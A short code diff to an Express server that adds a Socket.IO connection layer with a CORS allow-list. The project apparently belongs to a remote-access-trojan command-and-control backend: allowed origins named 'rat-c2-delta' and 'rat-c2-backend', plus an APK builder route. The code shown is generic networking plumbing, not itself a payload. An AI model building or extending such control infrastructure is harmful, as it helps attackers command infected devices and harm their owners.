@@ -18,6 +18,8 @@ const apkBuilderRoutes = require('./routes/apkBuilder');
 
 const app = express();
 const server = http.createServer(app);
+const { Server: SocketIOServer } = require('socket.io');
+const { setupSocketIO } = require('./socket/handler');
 
 // Connect to MongoDB
 connectDB();
@@ -105,5 +107,33 @@ server.listen(PORT, '0.0.0.0', () => {
   console.log(`Health Check: http://localhost:${PORT}/api/health`);
 });
 
-module.exports = { app, server };
+// Initialize Socket.IO
+const io = new SocketIOServer(server, {
+  cors: {
+    origin: function (origin, callback) {
+      const allowedOrigins = [
+        'http://localhost:3000',
+        'http://localhost:5000',
+        'https://rat-c2-delta.vercel.app',
+        'https://rat-c2-backend.onrender.com',
+      ];
+      if (!origin || allowedOrigins.indexOf(origin) !== -1) {
+        callback(null, true);
+      } else {
+        callback(new Error('Not allowed by CORS'));
+      }
+    },
+    methods: ['GET', 'POST'],
+    credentials: true,
+  },
+  pingTimeout: 60000,
+  pingInterval: 25000,
+});
+
+setupSocketIO(io);
+
+// Make io accessible to controllers
+app.set('io', io);
+
+module.exports = { app, server, io };
 
